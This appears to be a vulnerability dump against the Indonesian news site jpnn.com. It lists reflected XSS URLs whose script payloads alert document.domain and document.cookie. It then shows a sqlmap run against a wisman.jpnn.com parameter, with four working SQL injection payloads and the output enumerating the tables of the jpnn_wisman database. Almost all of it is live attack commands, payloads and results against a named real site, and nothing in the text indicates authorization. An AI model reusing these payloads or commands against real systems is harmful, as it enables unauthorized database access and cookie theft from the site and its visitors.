Xss in JPNN.com



Vuln Url 


https://www.jpnn.com/search?q=%22%3E%3Cimg+src%3Dxss+onerror%3Dalert(document.domain)%3E
https://alpha.jpnn.com/search?q=%22%3E%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&sa=jpnn_search&tab=jpnn_search
https://foto.jpnn.com/search?q=%22%3E%3Cscript%3Ealert%28%271%27%29%3B%3C%2Fscript%3E


Sql Injection *.JPNN.com

Vuln URL = http://wisman.jpnn.com/Penerbangan_langsung?bnd=10



sqlmap.py -u http://wisman.jpnn.com/Penerbangan_langsung?bnd=10 --tables -D jpnn_wisman
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.8.12#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:41:54 /2019-08-20/

[18:41:54] [INFO] resuming back-end DBMS 'mysql'
[18:41:54] [INFO] testing connection to the target URL
[18:41:55] [WARNING] potential permission problems detected ('Access denied')
[18:41:55] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: bnd (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: bnd=10' AND 4503=4503 AND 'uBQY'='uBQY

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: bnd=10' AND (SELECT 6635 FROM(SELECT COUNT(*),CONCAT(0x717a787171,(SELECT (ELT(6635=6635,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'wgDq'='wgDq

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: bnd=10' OR SLEEP(5) AND 'npCh'='npCh

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: bnd=10' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a787171,0x7947615a656b767877566d6d6c486e4b7371677945727552684d766561774a6b45466d5364624644,0x7162766a71)-- vAlV
---
[18:41:55] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[18:41:55] [INFO] fetching tables for database: 'jpnn_wisman'
Database: jpnn_wisman
[11 tables]
+---------------------+
| monitor_view        |
| monitor_view2       |
| penerbangan_bandara |
| penerbangan_negara  |
| pintumasuk_view     |
| wisman_daerah       |
| wisman_data         |
| wisman_ebook        |
| wisman_negara       |
| wisman_pintumasuk   |
| wisman_top_event    |
+---------------------+

[18:41:55] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 1 times
[18:41:55] [INFO] fetched data logged to text files under 'C:\Users\Kemenag-PC\AppData\Local\sqlmap\output\wisman.jpnn.com'

[*] ending @ 18:41:55 /2019-08-20/